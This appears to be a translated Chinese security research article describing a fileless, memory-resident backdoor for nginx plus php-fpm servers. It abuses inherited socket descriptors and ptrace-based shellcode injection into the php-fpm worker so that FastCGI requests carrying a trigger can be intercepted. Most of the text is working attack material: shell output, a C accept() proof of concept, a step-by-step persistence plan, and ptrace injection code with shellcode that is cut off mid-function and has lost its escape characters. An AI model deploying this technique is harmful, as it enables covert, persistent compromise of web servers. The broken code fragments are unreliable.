# php-fpm环境的一种后门实现
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
作者：imbeee[@360](https://github.com/360 "@360")观星实验室
## 简介
目前常见的php后门基本需要文件来维持（常规php脚本后门：一句话、大马等各种变形；WebServer模块：apache扩展等，需要高权限并且需要重启WebServer），或者是脚本运行后删除自身，利用死循环驻留在内存里，不断主动外连获取指令并且执行。两者都无法做到无需高权限、无需重启WeServer、触发后删除脚本自身并驻留内存、无外部进程、能主动发送控制指令触发后门（避免内网无法外连的情况）。
而先前和同事一块测试Linux下面通过/proc/PID/fd文件句柄来利用php文件包含漏洞时，无意中发现了一个有趣的现象。经过后续的分析，可以利用其在特定环境下实现受限的无文件后门，效果见动图：
## 测试环境
CentOS 7.5.1804 x86_64  
nginx + php-fpm(监听在tcp 9000端口)
为了方便观察，建议修改php-fpm默认pool的如下参数：
    # /etc/php-fpm.d/www.conf
    pm.start_servers = 1
    pm.min_spare_servers = 1
    pm.max_spare_servers = 1
修改后重启php-fpm，可以看到只有一个master进程和一个worker进程：
    [root@localhost php-fpm.d]# ps -ef|grep php-fpm
    nginx     2439 30354  0 18:40 ?        00:00:00 php-fpm: pool www
    root     30354     1  0 Oct15 ?        00:00:37 php-fpm: master process (/etc/php-fpm.conf)
## php-fpm文件句柄泄露
在利用php-fpm运行的php脚本里，使用system()等函数执行外部程序时，由于php-fpm没有使用FD_CLOEXEC处理句柄，导致fork出来的子进程会继承php-fpm进程的所有文件句柄。
简单测试代码：
     socket:[1168542]
    lrwx------ 1 nginx nginx 64 Oct 24 18:54 1 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 24 18:54 2 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 24 18:54 7 -> anon_inode:[eventpoll]
    [root@localhost php-fpm.d]#
确定socket:[1168542]为php-fpm监听的9000端口的socket句柄：
    [root@localhost php-fpm.d]# lsof -i:9000
    COMMAND   PID  USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
    php-fpm  2439 nginx    0u  IPv4 1168542      0t0  TCP localhost:cslistener (LISTEN)
    php-fpm 30354  root    6u  IPv4 1168542      0t0  TCP localhost:cslistener (LISTEN)
访问t1.php后，会阻塞在php的system函数调用里，此时查看sleep进程与worker进程的文件句柄：
    [root@localhost php-fpm.d]# ps -ef|grep sleep
    nginx     2547  2439  0 18:57 ?        00:00:00 sleep 60
    [root@localhost php-fpm.d]# ls -al /proc/2547/fd
    total 0
    dr-x------ 2 nginx nginx  0 Oct 24 18:58 .
    dr-xr-xr-x 9 nginx nginx  0 Oct 24 18:57 ..
    lrwx------ 1 nginx nginx 64 Oct 24 18:58 0 -> socket:[1168542]
    l-wx------ 1 nginx nginx 64 Oct 24 18:58 1 -> pipe:[1408640]
    lrwx------ 1 nginx nginx 64 Oct 24 18:58 2 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 24 18:58 3 -> socket:[1408425]
    lrwx------ 1 nginx nginx 64 Oct 24 18:58 7 -> anon_inode:[eventpoll]
    [root@localhost php-fpm.d]# ls -al /proc/2439/fd
    total 0
    dr-x------ 2 nginx nginx  0 Oct 24 18:54 .
    dr-xr-xr-x 9 nginx nginx  0 Oct 24 18:40 ..
    lrwx------ 1 nginx nginx 64 Oct 24 18:54 0 -> socket:[1168542]
    lrwx------ 1 nginx nginx 64 Oct 24 18:54 1 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 24 18:54 2 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 24 18:58 3 -> socket:[1408425]
    lr-x------ 1 nginx nginx 64 Oct 24 18:58 4 -> pipe:[1408640]
    lrwx------ 1 nginx nginx 64 Oct 24 18:54 7 -> anon_inode:[eventpoll]
可以发现请求t1.php后，nginx发起了一个fast-cgi请求到php-fpm进程，即woker进程里3号句柄`socket:[1408425]`。同时可以看到sleep继承了父进程php-fpm的0 1 2 3
7号句柄，其中的0号句柄也就是php-fpm监听的9000端口的socket句柄。
## 文件句柄泄露的利用
在子进程里有了继承来的socket句柄，就可以直接使用accept函数直接从该socket接受一个连接。下面是一个用于验证的简单c程序以及调用的php脚本：
    // test.c
    // gcc -o test test.c
    #include 
    #include 
    #include 
    int main(int argc, char *argv[])
    {
         int sockfd, newsockfd, clilen;
         struct sockaddr_in cli_addr;
         clilen = sizeof(cli_addr);
         sockfd = 0;    //直接使用0句柄作为socket句柄
         //这里accept会阻塞，接受连接后才会执行system()
         newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
         system("/bin/touch /tmp/lol");
         return 0;
    }
     socket:[1168542]
    lrwx------ 1 nginx nginx 64 Oct 25 11:16 1 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 11:16 2 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 12:11 3 -> socket:[1428118]
    lrwx------ 1 nginx nginx 64 Oct 25 11:16 7 -> anon_inode:[eventpoll]
    [root@localhost html]# ls -al /proc/2958/fd
    total 0
    dr-x------ 2 nginx nginx  0 Oct 25 11:16 .
    dr-xr-xr-x 9 nginx nginx  0 Oct 25 11:07 ..
    lrwx------ 1 nginx nginx 64 Oct 25 11:16 0 -> socket:[1168542]
    lrwx------ 1 nginx nginx 64 Oct 25 11:16 1 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 11:16 2 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 12:11 3 -> socket:[1428118]
    lrwx------ 1 nginx nginx 64 Oct 25 12:11 4 -> socket:[1428132]
    lrwx------ 1 nginx nginx 64 Oct 25 11:16 7 -> anon_inode:[eventpoll]
可以看到10秒内只有来自nginx的fast-cgi请求的3号句柄。而10秒后，4号句柄为php脚本中创建的socket，对应php脚本中的$socket资源。
如果我们能在php代码中构造出一个和0号句柄绑定的socket resource，我们就能直接用php的accpet()来处理来自nginx的fast-cgi请求而无需再起一个新的进程。但是翻遍了资料，最后发现php里无法用常规的方式构造指向特定文件句柄的resource。
但是我们发现worker进程在/proc/下面的文件owner并不是root，而是php-fpm的运行用户。这说明了php-fpm的master在fork出worker进程后，没有正确处理其dumpable flag，导致了我们可以用php-fpm
worker的运行用户的权限附加到worker上，对其进行操作。
那么我们就有了新的利用思路：
  1. php脚本运行后先删除自身
  2. php脚本里用socket_create()创建一个socket
  3. php脚本释放一个外部程序，使用system()调用，此时子进程继承worker进程的运行权限
  4. 子进程attach到父进程(php-fpm worker)，向父进程中注入shellcode，使用dup2()系统调用将0号句柄复制到步骤2中所创建的socket对应的句柄号，并恢复worker进程状态后detach，退出
  5. 子进程退出后，php代码里已经可以通过我们创建的socket resource来操作0号句柄，对其使用accept获取来自nginx的fast-cgi连接
  6. 解析fast-cgi请求，如果含有特定的指令，拦截请求并执行相应的代码，否则认为是正常请求，转发到9000端口让正常的php-fpm worker处理
通过这个利用方法，我们可以将大部分代码都用php实现，并且最终也是以一个被注入过的php-fpm进程的形式存在于服务器上。外部c程序只是用于注入worker进程，复制文件句柄。以下为注入shellcode的c代码：
    // dup04.c
    // gcc -o dup04 dup04.c
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    void *freeSpaceAddr(pid_t pid) {
        FILE *fp;
        char filename[30];
        char line[850];
        long addr;
        char str[20];
        char perms[5];
        sprintf(filename, "/proc/%d/maps", pid);
        fp = fopen(filename, "r");
        if(fp == NULL)
            exit(1);
        while(fgets(line, 850, fp) != NULL)
        {
            sscanf(line, "%lx-%*lx %s %*s %s %*d", &addr, perms, str);
            if(strstr(perms, "x") != NULL)
            {
                break;
            }
        }
        fclose(fp);
        return addr;
    }
    void ptraceRead(int pid, unsigned long long addr, void *data, int len) {
        long word = 0;
        int i = 0;
        char *ptr = (char *)data;
        for (i=0; i < len; i+=sizeof(word), word=0) {
            if ((word = ptrace(PTRACE_PEEKTEXT, pid, addr + i, NULL)) == -1) {;
                printf("[!] Error reading process memoryn");
                exit(1);
            }
            ptr[i] = word;
        }
    }
    void ptraceWrite(int pid, unsigned long long addr, void *data, int len) {
        long word = 0;
        int i=0;
        for(i=0; i < len; i+=sizeof(word), word=0) {
            memcpy(&word, data + i, sizeof(word));
            if (ptrace(PTRACE_POKETEXT, pid, addr + i, word) == -1) {;
                printf("[!] Error writing to process memoryn");
                exit(1);
            }
        }
    }
    int main(int argc, char* argv[]) {
        void *freeaddr;
        //int pid = strtol(argv[1],0,10);
        int pid = getppid();
        int status;
        struct user_regs_struct oldregs, regs;
        memset(&oldregs, 0, sizeof(struct user_regs_struct));
        memset(&regs, 0, sizeof(struct user_regs_struct));
        char shellcode[] = "x90x90x90x90x90x6ax21x58x48x31xffx6ax04x5ex0fx05xcc";
        unsigned char *oldcode;
        // Attach to the target process
        ptrace(PTRACE_ATTACH, pid, NULL, NULL);
        waitpid(pid, &status, WUNTRACED);
        // Store the current register values for later
        ptrace(PTRACE_GETREGS, pid, NULL, &oldregs);